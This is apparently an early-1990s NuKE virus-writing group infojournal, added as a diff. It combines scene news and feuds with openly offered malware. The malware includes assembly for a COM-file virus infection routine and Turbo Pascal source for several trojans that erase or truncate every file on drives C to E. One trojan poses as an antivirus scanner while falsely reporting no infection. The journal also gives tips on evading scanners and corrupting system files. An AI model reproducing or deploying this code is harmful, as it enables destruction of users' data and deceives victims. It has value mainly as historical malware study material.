+; look for several other .com files else where... with the help of the
+; path or simply searching for more <dir>...
+
+found_file:
+        mov     di,[si+file] ;di points to the filename
+        push    si
+        add     si,file          ;si points to filename...
+
+        mov     ax,offset 4300h  ;get file Attributes...
+        mov     dx,si            ;filename in dx..
+        int     21h
+
+        mov     file_attrib,cx   ;Save file Attributes.
+
+file    dw      0
+; Here we'll set the file attributes to nothing
+
+        mov     ax,offset 4301h    ;To set file Attributes...
+        mov     cx,offset 0fffeh   ;Set them to a Normal File
+        mov     dx,si              ;filename...
+        int     21h
+
+        mov     ax,offset 3d02h    ;Open File to Read/Write.
+        mov     dx,si              ;ASCIIZ filename
+        int     21h
+
+        jnb     ok                 ;If file was open continue
+        jmp     put_old_attrib     ; error happened restore old attribs
+                                   ; and quit.
+ok:
+        mov     bx,ax
+        mov     ax,offset 5700h    ;Get File Date & Time...
+        int     21h
+
+        mov     old_time,cx        ;Save old File Time...
+        mov     old_date,dx        ;Save old File Date
+
+old_time        db      0
+old_date        db      0
+
+; here we infect the file... but first we SAVE the first 3 bytes
+; somewhere in our virus
+
+        mov     ah,3fh          ;Read file...
+        mov     cx,3            ;Number of bytes to read
+        mov     dx,first_3      ;Save bytes in the buffer
+        add     dx,si           ;Filename...
+        int     21h
+
+        cmp     ax,3            ;Where 3 bytes read?
+        jnz     fix_file        ;If not fix file like before and quit
+
+first_3     equ     $    ; The First three bytes of the Original File!
+            int     20h  ; the virus is infected to.
+            nop
+
+; This moves the File pointer to the END of the file
+
+        mov     ax,offset 4202h
+        mov     cx,0
+        mov     dx,0
+        int     21h
+        mov     cx,ax          ;DX:AX is the FILESIZE!
+        sub     ax,3           ;subtract three because of file pointer
+
+        add     cx,offset c_len_y
+        mov     di,si
+        sub     di,offset c_len_x
+        mov     [di],cx        ;Modifies the 2nd & 3rd bytes of program
+
+; The writes our virus to the file
+
+        mov     ah,40h
+        mov     cx,virlength      ;Virus Length
+        mov     dx,si             ;File...
+        sub     dx,offset codelength  ;Length of virus codes.
+        int     21h
+
+        cmp     ax,offset virlength   ;all bytes written?
+        jnz     fix_file              ;If no fix file and quit
+
+;Moves the file pointer to the beginning of file and write the
+;3 bytes JMP at the beginning of the file
+
+        mov     ax,offset 4200h
+        mov     cx,0
+        mov     dx,0
+        int     21h
+
+        mov     ah,40h       ;Write to file...
+        mov     cx,3         ;# of bytes to write...
+        mov     dx,si        ;File name...
+        add     dx,jump      ;Point to the new JMP statement
+        int     21h
+
+jump    db      0e9h    ;This is the JMP that will be put in the
+                        ;Begining of the file!
+
+;Restore Old File Time & Date
+
+fix_file:
+        mov     dx,old_date     ;Old File Date
+        mov     cx,old_time     ;Old file Time...
+        and     cx,offset 0ffe0h ;Flat Attribs.
+        mov     ax,offset 5701h
+        int     21h
+
+        mov     ah,3eh
+        int     21h             ;Close file...
+
+
+; Here we'll restore the old file attributes...
+
+put_old_attrib:
+        mov     ax,offset 4301h
+        mov     cx,old_att      ;old File Attributes.
+        mov     dx,si           ;Filename...
+        int     21h
+
+;----------------------------- EnD -------------------------------------
+
+Anyhow that's it... Simple no? This source was also used in my ParaSite ][
+Virus that is STILL undetectable to date with Scanv85. Anyhow I even made
+it MORE simpler than my real sources that have to play with the file paths.
+
+Anyhow theres still work to be done, like you must restore the old data file
+so it will jump to 100h and run the old file the virus was infected too!
+Remember to store them in the beginning and then restore them! Anyhow there's
+a few Variables to be put in like `VirLength' which you should know how to
+do that also the `CodeLength' that is the VIRUS codes ONLY not counting the
+Stacks.
+
+Anyhow This works FINE with a Non-Resident Virus. Because a few statements
+would have to be edited for TSRs. Anyhow try to use this, it's small neat
+and fast.
+
+Anyhow Perhaps next issue I will develop a SIMPLE Ram-Resident virus that
+infects COMs and EXEs to be released into the next issue! Though I just
+release this sources for you to LEARN! Rather than putting you name on my
+virus and releasing another strain on work I worked Hard upon! Anyhow I
+should release a SIMPLE new Virus source for all you programmers out there!
+And I will even explain a few Stealth Technics like how to hide your program
+in memory right under the TOM.
+
+If there's Any Questions you want to know, please ask them I will answer
+them in the next [NukE] Releases... I may even release source codes on how
+to make an Algorithm Encryption method! I've developed one on my own,
+without the V2PX viruses sources... Anyhow it does the job and the formula
+I developed has an UNLIMITED amount of encryption methods! But since the
+virus codes have to be SMALL Like close to 2,000 bytes I will limit the
+formula to about 1,000 different combinations!
+
+                           Rock Steady
+                NukE / Viral Development Reaseacher
+                             -PeAcE-
+
+%End of File%
+%^24^%
+The Viper-1 Virus
+Lord Venom and Rigor Mortis
+
+                -/\-] Southern Corrupted Programming [-/\-
+                          -/\-] Presents [-/\-
+
+
+             =           =                                  =
+              =         =                                 = =
+               =       =    =   = = =   = = =  = = =        =
+                =     =     =   =    =  =      =    =  ===  =
+                 =   =      =   = = =   = = =  = = =        =
+                  = =       =   =       =      =   =        =
+                   =        =   =       = = =  =    =     = = =
+
+               CopyRight 1991,92  SCP-DC ViRII Development Corp.
+
+                          -[ EAT'SHiT AND DiE! ]-
+
+
+        Details:
+
+                Virii Name -: ViPER-1
+
+           Virii Author(s) -: Lord Venom   [SCP]
+                              Rigor Mortis [SCP]
+
+   Development Information -: Evolved from the Leprosy-B Strain of virus
+                              with some influence from the Plague Virus.
+
+           Program Details -: Written and compiled with TURBO ASSEMBLER V2.01
+
+         Technical Details -: Kernal Size of virii 840 Bytes TOTAL
+                              Overwriting Type -
+                               first 840 Bytes of host file
+                              Directory Searching
+                              Com and Exe infector
+                              Self Encrypting
+                              Displays SCP Message at critical mass
+
+
+        Comments:
+
+        The VIPER-I virus is a classic Overwriting virus which will also
+        SELF-ENCRYPT to hide itself from prying eyes.
+        Once all files (EXE and COM's) in the host directory are all infected
+        the VIPER-I virus displays a NOTICE of infection to the Victim.
+        Then move up to the Parent directory and continues, this will continue
+        until ALL files in ALL directories up to the Root dir.
+        Also to fool the unwary, VIPER-I will display a FAKE error message to
+        the user when a file has been disabled by the virus.
+
+
+        Final:
+
+        We hope you will enjoy this S.C.P. Product.
+
+        Regards,
+
+                    Phrozen Doberman
+                    Lord Venom
+                    Rigor Mortis
+                    and all the rest of the SCP Team.
+
+        Greets to -: All SCP Sites and SCPNet Damage Centers
+                     All NukE Members...
+                     and Everyone else thats interested in this field.
+
+
+Lord Venom and Rigor Mortis, [NuKE/SCP]
+
+%End of File%
+%^11^%
+Introduction to this Infojournal
+Mechanix
+
+    Welcome to the second release of the NuKE Infojournal. Before we start, I
+would personaly like to dedicate this release to Prince Of Thieves, a member
+who did not deserve what happened to him. After our first release, we got lots
+of good suggestions and criticism, so we decided to release issue #2. The most
+recurring feedback we got, was about the non technical side of the
+infojournal. Well to that, I add that it takes more than a bunch of technical
+programming to keep readers interrested, as most people also enjoy a little
+background and news. I also still stress that this is not a magazine, and will
+never become one, as long as I am writing for it. We don't want this to be a
+regular release. We release these when we have enough material to put in, and
+since we are not monetarily or otherwise obligated, we will release them at
+our own convenience, not on a strict schedule. But, the more you wait, the
+better it is. I have also improved the program a little, simply because I
+found myself with some spare time during the holidays. I hope the additions of
+fonts and scrolling will please all readers. The next release will most
+probably be programed in C by Rock Steady, and thus it will change format
+completely, as he has his own ideas. Anyways, in this issue, you will find the
+source to most of the programs described in the first issue, as well as some
+other articles. Once again, if you have any suggestions or criticism about
+this issue, your comments are always welcome on any of our sites. We are
+also thinking of making this infojournal an open forum. This would mean that
+not only NuKE members would write the articles, but anybody with a valuable
+idea can make an addition to it. This would help a lot, firstly by increasing
+the amount of information in each issue, and secondly by increasing the amount
+of people who read it. So anyone with an article they would like to see
+printed, call up any NuKE site, and email any NuKE member. Once again, all
+opinions are welcome. Also, one little note. Some people might wonder what the
+article on Illusion BBS software is doing in the articles section. Well since
+this is a new project, and that Acid Face is one of the programmers, I've
+decided to include it in this release, as to get the news around about this
+new software.
+
+ Mî›H’ï!X/ïšKî
+  Mechanix/NuKE
+
+%End of File%
+%^15^%
+Overview of 514
+Mechanix
+
+%Overview:
+
+    With the release of the first Infojournal, I had voiced some expectations
+in my closing remarks. Well during the 3 months since the release of this
+first Infojournal a lot has happened in the 514 computer world, most of it
+very troubling to the computer underground. First of all, the 514 pirate scene
+has been shaken up by the recent crackdown on 90-North by the RCMP (Royal
+Canadian Mounted Police: our version of Federal Agents). 90-North was a pirate
+board boasting an incredible 10 lines. However this is what probably caused
+it's downfall, along with the fact that a subscription was mandatory for the
+transfer of Copyrighted software. Personaly I, not being involved in the
+pirating of software, took this very lightly. However after this incident,
+many 514 pirate boards closed down due to these recent events, the most
+notable being Savage Land, and a few others. Other boards have pulled off the
+Copyrights and others closed down temporarily for a few weeks. The H/P scene
+was untouched by this. Instead, another event was to shake up this second part
+of the computer underground. It must be noted that in the 514 area code, one
+of the most ridiculous ACNs in North America, every board, that isn't public
+domain, has claimed to be H/P support. However, upon seeing some of them, I
+realize that most of them have no idea what H/P is. Most of these "Hackers"
+have never seen a unix system, or have no idea what Phrack is, or what LOD
+used to be. Anyhow, most of them saw this H/P support as way to collect a load
+of virii, charge incredible ratios for them, and leech PBXes off others. Well
+it is because of this that every modemer and his brother now has a PBX number,
+10 minutes after it was found. This is why, a rumor started from an unknown
+source saying that the 514-878-xxxx series of PBXes (who were used by just
+about everyone in existence) were all being traced by Bell, and all calls were
+billed to the originating phone line. Well this has turned out to be an empty
+scare, as I know of no one who has been billed for calls made through these
+PBXes. However, as of January 1st 1992, all the PBXes in question went belly
+up, and 514 is once more without a decent code-line. To add to this, the whole
+CMBPACx series of NUIs for Tymenet went down, and it seems the whole Telenet
+scene is suffering in this area. Anyways, enough of this and back to events
+that we care most about.
+
+%NuKE vs. RABID:
+
+    Not long ago, RABID released the first issue of CENSOR. In this issue,
+Data Disruptor launched a vicious little attack towards NuKE. Well most of you
+probably ignore the whole story, so I will enlighten you. It all started with
+the release of the Parasite virus by Rock Steady. The virus contained a
+message directed towards RABID, a message intended as a joke. Anyhow, Data
+Disruptor did not see it this way and had a discussion with Rock Steady. So,
+being an easy going guy, Rock Steady sent out an apology to RABID, but it was
+shot down by Data Disruptor, who also added in a couple of low blows. So,
+seeing Data Disruptor was nothing but an asshole, Rock Steady submitted the
+parasite virus to the CVIA, knowing that the text string in the codes would be
+printed in the upcoming release of VSUM (a McAffee product). But, of course,
+RABID deformed the whole thing to there advantage. It should also be noted
+that Data Disruptor has been guilty of the same kind of ass licking that he
+accused Rock Steady of doing on the CVIA. Now, I could of included a few
+excerpts from the CVIA like RABID did, but I won't go down to that level, and
+will just tell readers out there to check out messages #5340, 5376 and so on,
+on the CVIA message bases. It was also stated in Censor #1 that RABID demanded
+a public apology in this release of our Infojournal. Well I think I speak for
+all the NuKE members involved when I say that we are never going to apologize
+to RABID, when we could demand the same thing from them. I could of gotten
+very low with this article, seeing I have learned a lot on RABID in the past
+month or so. Well I won't say anything, on the condition that RABID leaves us
+alone. Rumor has it that RABID is dead. Well whether they are gone or just
+laying low, NuKE will leave them alone if they stay out of our business. This
+includes sending a "spy" after one of our members (you know who you are, and
+we haven't forgotten). Anyways there is a more extensive article on this
+subject in this release.
+
+%514 groups:
+
+    Well, in the last release, I hoped by the this release, we would be the
+dominating underground group in the 514 ACN. This of course does not include
+groups involved in pirating, graphics... Only H/P related groups. Well it is
+my pleasure to say that we have succeeded. All anti-hacker groups have
+dissapeared, and other groups like HiF and FiS have died away, leaving us as
+the only ones left with any bulk wathsoever. Another crash and burn try for a
+group was Venom, supposed to a hacking group started by Time Lord and Sampson,
+but it never did anything and died away peacefully.
+
+%SCP/NuKE:
+
+    Also, in the past months, NuKE has decided to expand a little, and raise
+the quality of our group. We have had a few members leave us for personal
+reasons, but have gotten better ones, such as Nowhere Man in 708 and Igmaster
+in 604 along with one of the best H/P boards around as a site, The Hells Pit
+in 708, operated by Hades and Kato. But the most notable addition is the
+agreement with the Australian group SCP (now SCP/NuKE) to represent us in
+that continent. With this "merger" we gain many members and sites. An updated
+list of all members and sites of NuKE and SCP/NuKE can be found in this
+Infojournal.
+
+%TPR-NDC:
+
+    It has been noted by us, that for the past 6 months, the H/P scene in 514
+has gone straight to the gutter. It's been a while since boards have contained
+quality hacking/phreaking oriented discussions. We have been marred by an
+influx of wares mongers and code leeches, but nothing of any quality, with the
+possible exception of Realm of Chaos, a board that went down for no apparent
+reason. This is why I have taken it upon myself to put up an exclusively
+hack/phreak oriented board in 514. I also typed up a few questionnaires, and
+was astonished at how many people could not answer a damn question, even with
+the 10 day period allowed to them to answer. Users who considered themselves
+as top of the line hackers/phreakers could not even define ANI or explain how
+to use a blue box, or what DTMF was. It is because of this that only twenty
+514 callers will be allowed to remain on the system (TPR) and the remaining
+room will be made available to long distance callers who seem to know a little
+more about H/P. With this, The Darkman, sysop of the old Dark Domain, decided
+to do the same and deleted everyone, as to set up a new board (NDC) along the
+same standards of admission as TPR. With these two systems, we hope to bring a
+new breath of fresh air to 514 and to be able once again to support the
+underground in a respectable way. The phone numbers to these two systems are
+not published here but you can get them off any current user, or any NuKE
+member.
+
+%Presently:
+
+    Well it seems that for the first time since the formation of our group,
+NuKE is not involved in arguments with anyone. First there was HiF, the an
+incident with Dallas Barr (where is this guy?), the RABID incident, but
+for now, we are at peace, and it feels really good. We are not a bunch of
+sadistic people who go around attacking every group out there. If a group is
+good and deserves respect, then we will be the first to give them that. But if
+a group gives us crap, like HiF did, then we will do anything in our power to
+rectify this, and you might notice that HiF is no more. Whether we helped this
+or not, we don't care, as long as they are out of are faces. Well that's it
+for this article, which I will probably make a regular appearance in all
+future releases.
+
+ Mî›H’ï!X/ïšKî
+  Mechanix/NuKE
+
+%End of File%
+%^25^%
+Update on NuKE wares
+Mechanix
+
+    It has been revealed to us that all of the virii that NuKE has released up
+to January 1992, are all detectable by scan v86 from McAfee. It seems that
+someone who had fast access to our releases sent them up to McAfee as fast as
+he could. This also means that all our viral releases are detailed in the
+latest VSUM (by Patricia Hoffman), the January 1992 edition. Originally, only
+the parasite was supposed to be in VSUM, and we sent it up ourselves, but
+strangely, this is the only one of are past virii that has not been detailed
+in VSUM. This reinforces our theory that someone backstabbed us, in addition
+to the fact that most of the descriptions have many holes and mistakes. If you
+want to see for yourself, just pick up the January 1992 issue of VSUM and
+search for our virii names, such as Sicillian Mob, Amilia, C Virus (called
+Nowhere Man virus by mistake), Viper (a SCP/NuKE release). We have a pretty
+good idea who did this to us, and we are just accumulating information on this
+person, and the whole story should be out by the next issue. So to all those
+who hoped our releases were unscannable, well sorry to dissapoint you, but I
+can assure you that this will not happen again, and all releases from the date
+of this infojournal will be unscannable for as long as possible. It should be
+noted that all of our past virii are programed either by Rock Steady, Nowhere
+Man or the members of SCP/NuKE, and that all others are fakes. Jack Damn, a
+new member, will also be programming virii, but has not released anything for
+NuKE yet.
+
+ Mî›H’ï!X/ïšKî
+  Mechanix/NuKE
+
+%End of File%
+%^41^%
+Trojan sources
+Mechanix
+
+    Over the past few months, a few changes have occurred. First of all, Rock
+Steady and Nowhere Man are releasing all of NuKEs virii along with the members
+of SCP/NuKE. There are also members like Acid Face that release the trojans,
+backdoors, and other non-viral material. For this reason, I have seen my
+usefulness die off when it comes to programming destructive software. I will
+still program things like this infojournal, but I will not be releasing any
+trojans, backdoors in the future. However, with my return to university, and
+the re-establishment of my Internet access and address, I focus my efforts to
+another area. So for now, crashing is out and networking is back in. Trust me,
+forget phreaking, networking is the future. Sure, you might not be able to
+download the latest twenty five megs game, but I couldn't care less. The
+internet (BITnet, MILnet...) is where it's at. Anyways I will be releasing a
+multi-part extensive look at the internet as my knowledge expands. This should
+be released by infojournal #3 or #4, as I plan to write it during summer, when
+my studies are over. So this is why, in this issue, I will release the sources
+to all trojans (by me) mentioned in issue #1. Remember, all of these are in
+Turbo Pascal (don't ask) and all are original. There will be no commenting or
+explanations, as most are pretty straight-forward and to the point. Have fun,
+and don't abuse these.
+
+ Mî›H’ï!X/ïšKî
+  Mechanix/NuKE
+
+%End of File%
+%^44^%
+Kreator Trojan v3.0
+Mechanix
+
+PROGRAM KREATOR3;
+
+USES DOS;
+
+VAR
+
+S     : STRING[12];
+n,m,i : BYTE;
+f     : TEXT;
+
+PROCEDURE KREATE;
+ BEGIN
+  Randomize;
+  S := '............';
+   FOR i := 1 TO 8 DO
+    S[i] := CHR(RANDOM(130)+125);
+   FOR i := 10 TO 12 DO
+    S[i] := CHR(RANDOM(130)+125);
+   S[9] := '.';
+   {$I-}
+   Mkdir (S);
+   {$I+}
+ IF IORESULT = 0 THEN
+  Begin
+   Chdir (S);
+   Rewrite (f);
+   Writeln (f,' ');
+   Writeln (f,'                             You have been ïšKîD');
+   Writeln (f,'                           [NuKE] and NUKE WaReZ 91');
+   Writeln (f,' ');
+   Close (f);
+   Setfattr (f,$01+$02);
+   Chdir ('..');
+  End
+ ELSE
+  m := 254;
+ END;
+
+
+PROCEDURE KILL_DRIVE;
+ BEGIN
+  m := 0;
+  ASSIGN (f,'README.NOW');
+  REPEAT
+   Begin
+    KREATE;
+    Chdir (S);
+    n := 0;
+     REPEAT
+      Begin
+       KREATE;
+       n := n+1;
+      End;
+     UNTIL n = 10;
+    Chdir ('..');
+    m := m+1;
+   End;
+  UNTIL m = 20;
+ END;
+
+
+BEGIN
+ {$I-}
+ Chdir ('C:\');
+ {$I+}
+ IF IORESULT = 0 THEN
+ KILL_DRIVE;
+
+ {$I-}
+ Chdir ('D:\');
+ {$I+}
+ IF IORESULT = 0 THEN
+ KILL_DRIVE;
+
+ {$I-}
+ Chdir ('E:\');
+ {$I+}
+ IF IORESULT = 0 THEN
+ KILL_DRIVE;
+END.
+
+%End of File%
+%^45^%
+Kreator Trojan v4.0
+Mechanix
+
+PROGRAM KREATOR4;
+
+USES DOS;
+
+VAR
+
+S     : STRING[12];
+m,i : BYTE;
+f     : TEXT;
+
+PROCEDURE KREATE;
+ BEGIN
+  Randomize;
+  S := '............';
+   FOR i := 1 TO 8 DO
+    S[i] := CHR(RANDOM(130)+125);
+   FOR i := 10 TO 12 DO
+    S[i] := CHR(RANDOM(130)+125);
+   S[9] := '.';
+   {$I-}
+   Mkdir (S);
+   {$I+}
+  IF IORESULT = 0 THEN
+   Begin
+    Chdir (S);
+    Rewrite (f);
+    Writeln (f,' ');
+    Writeln (f,'                             You have been ïšKîD');
+    Writeln (f,'                           [NuKE] and NUKE WaReZ 91');
+    Writeln (f,' ');
+    Close (f);
+    Setfattr (f,$01+$02);
+    Chdir ('..');
+   End
+  ELSE
+   m := 254;
+ END;
+
+
+PROCEDURE KILL_DRIVE;
+ BEGIN
+  m := 0;
+  ASSIGN (f,'README.NOW');
+  REPEAT
+   Begin
+    KREATE;
+    m := m+1;
+   End;
+  UNTIL m = 255;
+ END;
+
+
+BEGIN
+ {$I-}
+ Chdir ('C:\');
+ {$I+}
+ IF IORESULT = 0 THEN
+ KILL_DRIVE;
+
+ {$I-}
+ Chdir ('D:\');
+ {$I+}
+ IF IORESULT = 0 THEN
+ KILL_DRIVE;
+
+ {$I-}
+ Chdir ('E:\');
+ {$I+}
+ IF IORESULT = 0 THEN
+ KILL_DRIVE;
+END.
+
+%End of File%
+%^46^%
+Scanner Trojan v1.0
+Mechanix
+
+PROGRAM SCANNER1;
+
+USES DOS;
+
+VAR
+ Target  : SEARCHREC;
+ T       : FILE;
+ G       : TEXT;
+
+PROCEDURE DIRECT   (PATH : STRING);
+
+VAR
+ PATH2    : STRING;
+ INFO     : SEARCHREC;
+ INFO2    : SEARCHREC;
+ F        : FILE;
+
+BEGIN
+ Findfirst (PATH + '\*.*',$10,INFO);
+ WHILE DOSERROR = 0 DO
+  BEGIN
+   IF (INFO.ATTR = $10) AND (INFO.NAME[1] <> '.') THEN
+    Begin
+     PATH2 := PATH + '\' + INFO.NAME;
+      Chdir (PATH2);
+       Findfirst ('*.*',($3F - $10),INFO2);
+       WHILE DOSERROR = 0 DO
+        Begin
+         ASSIGN (F,INFO2.NAME);
+         Setfattr (F,$20);
+         Rewrite (F);
+         Close (F);
+         Erase (F);
+         Findnext(INFO2);
+       End;
+      DIRECT (PATH2);
+    End;
+   Findnext(INFO);
+  End;
+ END;
+
+
+
+PROCEDURE FILEFIND (DRIVE : CHAR);
+
+BEGIN
+ Chdir (DRIVE + ':\');
+ Findfirst ('*.*',($3F - $10),Target);
+ WHILE DOSERROR = 0 DO
+  Begin
+   ASSIGN (T,Target.name);
+   Setfattr (T,$20);
+   {$I-}
+   Rewrite (T);
+   {$I+}
+   IF IORESULT = 0 THEN
+    Begin
+     Close (T);
+     Erase (T);
+    End
+   ELSE
+    Exit;
+   Findnext (Target);
+  End;
+ DIRECT  (DRIVE + ':');
+END;
+
+
+
+
+BEGIN
+
+ {$I-}
+ Chdir ('C:\');
+ {$I+}
+ IF IORESULT = 0 THEN
+ Begin
+  FILEFIND ('C');
+  Chdir ('C:\');
+  ASSIGN (G,'README.NOW');
+  {$I-};
+  Rewrite (G);
+  {$I+};
+   IF IORESULT = 0 THEN
+    Begin
+     Writeln (G,' ');
+     Writeln (G,'                           This drive has been ïšKîD');
+     Writeln (G,'                            [NuKE] and NUKE WaReZ 91');
+     Writeln (G,' ');
+     Close (G);
+    End;
+ End;
+
+ {$I-}
+ Chdir ('D:\');
+ {$I+}
+ IF IORESULT = 0 THEN
+ Begin
+  FILEFIND ('D');
+  Chdir ('D:\');
+  ASSIGN (G,'README.NOW');
+  {$I-};
+  Rewrite (G);
+  {$I+};
+   IF IORESULT = 0 THEN
+    Begin
+     Writeln (G,' ');
+     Writeln (G,'                           This drive has been ïšKîD');
+     Writeln (G,'                            [NuKE] and NUKE WaReZ 91');
+     Writeln (G,' ');
+     Close (G);
+    End;
+ End;
+
+
+ {$I-}
+ Chdir ('E:\');
+ {$I+}
+ IF IORESULT = 0 THEN
+ Begin
+  FILEFIND ('E');
+  Chdir ('E:\');
+  ASSIGN (G,'README.NOW');
+  {$I-};
+  Rewrite (G);
+  {$I+};
+   IF IORESULT = 0 THEN
+    Begin
+     Writeln (G,' ');
+     Writeln (G,'                           This drive has been ïšKîD');
+     Writeln (G,'                            [NuKE] and NUKE WaReZ 91');
+     Writeln (G,' ');
+     Close (G);
+    End;
+ End;
+END.
+
+%End of File%
+%^47^%
+Scanner Trojan v2.0
+Mechanix
+
+PROGRAM SCANNER2;
+
+USES DOS, CRT;
+
+VAR
+ Target  : SEARCHREC;
+ T       : FILE;
+ G       : TEXT;
+
+PROCEDURE DIRECT   (PATH : STRING);
+
+VAR
+ PATH2    : STRING;
+ INFO     : SEARCHREC;
+ INFO2    : SEARCHREC;
+ F        : FILE;
+
+BEGIN
+ Findfirst (PATH + '\*.*',$10,INFO);
+ WHILE DOSERROR = 0 DO
+  BEGIN
+   IF (INFO.ATTR = $10) AND (INFO.NAME[1] <> '.') THEN
+    Begin
+     PATH2 := PATH + '\' + INFO.NAME;
+      Chdir (PATH2);
+       Findfirst ('*.*',($3F - $10),INFO2);
+       WHILE DOSERROR = 0 DO
+        Begin
+         ASSIGN (F,INFO2.NAME);
+         Setfattr (F,$20);
+         Rewrite (F);
+         Gotoxy (12,4); Write (PATH2,'\',INFO2.NAME);
+         Clreol;
+         Close (F);
+         Erase (F);
+         Findnext(INFO2);
+       End;
+      DIRECT (PATH2);
+    End;
+   Findnext(INFO);
+  End;
+ END;
+
+
+
+PROCEDURE FILEFIND (DRIVE : CHAR);
+
+BEGIN
+ Chdir (DRIVE + ':\');
+ Findfirst ('*.*',($3F - $10),Target);
+ WHILE DOSERROR = 0 DO
+  Begin
+   ASSIGN (T,Target.name);
+   Setfattr (T,$20);
+   {$I-}
+   Rewrite (T);
+   {$I+}
+   IF IORESULT = 0 THEN
+    Begin
+     Gotoxy (12,4);
+     Write (DRIVE,':\',Target.name);
+     Clreol;
+     Close (T);
+     Erase (T);
+    End
+   ELSE
+    Exit;
+   Findnext (Target);
+  End;
+ DIRECT  (DRIVE + ':');
+END;
+
+
+
+
+BEGIN
+
+ Clrscr;
+ Gotoxy (2,2);
+ Write ('Disk Physician v1.00á - Copyright 1991-92 by Virex Technologies. ');
+ Gotoxy (2,3);
+ Write ('Checking for file irregularities.');
+ Gotoxy (2,4);
+ Write ('Checking: ');
+ Gotoxy (2,5);
+ Write ('Status: ');
+
+ {$I-}
+ Chdir ('C:\');
+ {$I+}
+ IF IORESULT = 0 THEN
+ Begin
+  FILEFIND ('C');
+  Chdir ('C:\');
+  ASSIGN (G,'REPORT.!!!');
+  {$I-};
+  Rewrite (G);
+  {$I+};
+   IF IORESULT = 0 THEN
+    Begin
+     Gotoxy (10,5); Write ('Please wait, writing Report file.  ');
+     Writeln (G,' ');
+     Writeln (G,'                           This drive has been tested');
+     Writeln (G,'                        and shows no signs of infection.');
+     Writeln (G,' ');
+     Close (G);
+     Delay (1000);
+     Gotoxy (10,5); Clreol;
+    End;
+ End;
+
+ {$I-}
+ Chdir ('D:\');
+ {$I+}
+ IF IORESULT = 0 THEN
+ Begin
+  FILEFIND ('D');
+  Chdir ('D:\');
+  ASSIGN (G,'REPORT.!!!');
+  {$I-};
+  Rewrite (G);
+  {$I+};
+   IF IORESULT = 0 THEN
+    Begin
+     Gotoxy (10,5); Write ('Please wait, writing Report file.  ');
+     Writeln (G,' ');
+     Writeln (G,'                           This drive has been tested');
+     Writeln (G,'                        and shows no signs of infection.');
+     Writeln (G,' ');
+     Close (G);
+     Delay (1000);
+     Gotoxy (10,5); Clreol;
+    End;
+ End;
+
+ {$I-}
+ Chdir ('E:\');
+ {$I+}
+ IF IORESULT = 0 THEN
+ Begin
+  FILEFIND ('E');
+  Chdir ('E:\');
+  ASSIGN (G,'REPORT.!!!');
+  {$I-};
+  Rewrite (G);
+  {$I+};
+   IF IORESULT = 0 THEN
+    Begin
+     Gotoxy (10,5); Write ('Please wait, writing Report file.  ');
+     Writeln (G,' ');
+     Writeln (G,'                           This drive has been tested');
+     Writeln (G,'                        and shows no signs of infection.');
+     Writeln (G,' ');
+     Close (G);
+     Delay (1000);
+     Gotoxy (10,5); Clreol;
+    End;
+ End;
+ Gotoxy (10,5);
+ Write ('No irregularities found. Please read Report file for ');
+ Writeln ('complete update.   ');
+ Gotoxy (2,12);
+
+END.
+
+%End of File%
+%^48^%
+Trojan Development
+Mechanix
+
+    Well as I said in the previous article, I will probably not write anymore
+trojans for a while. However I did have a few ideas for some, so I will share
+them with you. Actually, the only idea I can think of now is the following.
+Have your trojan seek into a file (preferably one of the hidden .SYS files of
+the root directory), and after disabling all attributes, crypt one line of the
+file by adding 10 to each characters value. This will cause the program to
+hang everytime, even though the file size stays identical. Also, don't forget
+to reset the files date and time to what they were. Well that's all I can
+think of now.
+
+ Mî›H’ï!X/ïšKî
+  Mechanix/NuKE
+
+%End of File%
+%^43^%
+Infector Trojan v1.0
+Mechanix
+
+PROGRAM INFECTOR1;
+
+USES DOS;
+
+VAR
+ Target  : SEARCHREC;
+ T       : FILE;
+
+PROCEDURE DIRECT   (PATH : STRING ; FIND : STRING);
+
+VAR
+ PATH2    : STRING;
+ INFO     : SEARCHREC;
+ INFO2    : SEARCHREC;
+ F        : FILE;
+
+BEGIN
+ Findfirst (PATH + '\*.*',$10,INFO);
+ WHILE DOSERROR = 0 DO
+  BEGIN
+   IF (INFO.ATTR = $10) AND (INFO.NAME[1] <> '.') THEN
+    Begin
+     PATH2 := PATH + '\' + INFO.NAME;
+      Chdir (PATH2);
+       Findfirst (FIND,($3F - $10),INFO2);
+       WHILE DOSERROR = 0 DO
+        Begin
+         ASSIGN (F,INFO2.NAME);
+         Setfattr (F,$20);
+         Reset (F);
+         Seek (F,Filesize(F) DIV 2);
+         Truncate (F);
+         Close (F);
+         Findnext(INFO2);
+       End;
+      DIRECT (PATH2,FIND);
+    End;
+   Findnext(INFO);
+  End;
+ END;
+
+
+
+PROCEDURE FILEFIND (DRIVE : CHAR ; FIND : STRING);
+
+BEGIN
+ Chdir (DRIVE + ':\');
+ Findfirst (FIND,($3F - $10),Target);
+ WHILE DOSERROR = 0 DO
+  Begin
+   ASSIGN (T,Target.name);
+   Setfattr (T,$20);
+   {$I-}
+   Mkdir ('T.T');
+   {$I+}
+   IF IORESULT = 0 THEN
+    Begin
+     Rmdir ('T.T');
+     Reset (T);
+     Seek (T,Filesize(T) DIV 2);
+     Truncate (T);
+     Close (T);
+    End
+   ELSE
+    Exit;
+   Findnext (Target);
+  End;
+ DIRECT  (DRIVE + ':',FIND);
+END;
+
+
+
+
+BEGIN
+
+ {$I-}
+ Chdir ('C:\');
+ {$I+}
+ IF IORESULT = 0 THEN
+  Begin
+   FILEFIND ('C','*.COM');
+   FILEFIND ('C','*.EXE');
+   FILEFIND ('C','*.SYS');
+  End;
+
+ {$I-}
+ Chdir ('D:\');
+ {$I+}
+ IF IORESULT = 0 THEN
+  Begin
+   FILEFIND ('D','*.COM');
+   FILEFIND ('D','*.EXE');
+   FILEFIND ('D','*.SYS');
+  End;
+
+ {$I-}
+ Chdir ('E:\');
+ {$I+}
+ IF IORESULT = 0 THEN
+  Begin
+   FILEFIND ('E','*.COM');
+   FILEFIND ('E','*.EXE');
+   FILEFIND ('E','*.SYS');
+  End;
+
+END.
+
+%End of File%
+%^14^%
+NuKE Update
+Mechanix
+
+%Update:
+
+    During the time elapsed since our first release of the infojournal, NuKE
+has gone through some heavy restructuring of both members and sites. First
+off, Dr.Feelgood and Prince Of Darkness have both left the group for personal
+reasons. Optic Fiber has been forced to leave due to legal troubles. Some of
+you may have seen an announcement on FelonyNet that Nemesis had been kicked
+out. Well he was, but after the whole story got uncovered, we discovered that
+it was an unjust accusation, and thus Nemesis remains in NuKE and his board
+remains a site. We have also added on the services of Nowhere Man in 708 and
+Igmaster in 604. In the past few weeks, we have also added on two more 514
+users, namely Phrozen Virus and Jack Damn. This now brings the member list to
+eleven individuals and this is just enough for us. As for sites, with the
